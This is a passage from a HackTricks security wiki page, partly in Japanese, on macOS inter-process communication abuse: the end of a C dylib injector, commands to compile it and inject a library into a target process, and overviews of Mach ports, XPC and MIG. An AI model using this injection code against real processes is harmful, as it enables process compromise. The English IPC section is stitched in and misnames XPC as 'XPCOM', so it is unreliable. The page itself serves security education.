int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>  

## macOS IPC (Inter-Process Communication)

### Mach Ports

Mach ports are endpoints for inter-process communication in macOS. They are used by processes to send and receive messages. Each Mach port has a unique identifier and a set of send rights and receive rights. Processes can communicate with each other by sending messages through Mach ports.

### XPC Services

XPC (XPCOM) is a lightweight inter-process communication mechanism used in macOS. XPC services allow processes to communicate with each other securely. XPC services are defined by a .xpc file, which contains the service's executable code and configuration information.

### Distributed Objects

Distributed Objects is an inter-process communication technology in macOS that allows objects to be passed between processes. It enables processes to interact with each other by passing Objective-C objects. Distributed Objects uses the NSConnection class to establish connections between processes.

### NSXPCConnection

NSXPCConnection is a class in macOS that facilitates communication between processes using XPC. It allows processes to create secure connections and exchange messages. NSXPCConnection is commonly used in macOS applications to implement secure inter-process communication.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### タスクポートを介したスレッドハイジャッキング <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

この技術では、プロセスのスレッドがハイジャックされます:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 基本情報

XPCは、macOSおよびiOSで使用されるカーネルであるXNU間のプロセス間通信を意味し、**プロセス間の通信**のためのフレームワークです。 XPCは、システム上の異なるプロセス間で**安全で非同期なメソッド呼び出しを行うメカニズム**を提供します。これはAppleのセキュリティパラダイムの一部であり、**特権を分離したアプリケーション**の作成を可能にし、各**コンポーネント**が**必要な権限のみ**でジョブを実行するため、侵害されたプロセスからの潜在的な損害を制限します。

この**通信方法**や**脆弱性**についての詳細については、以下を参照してください:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIGは、Mach IPCコードの作成プロセスを**簡素化する**ために作成されました。基本的には、サーバーとクライアントが指定された定義と通信するために必要なコードを**生成**します。生成されたコードが醜い場合でも、開発者はそれをインポートするだけで、彼のコードは以前よりもはるかに簡単になります。

詳細については、以下を参照してください:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## 参考文献

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローしてください。
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
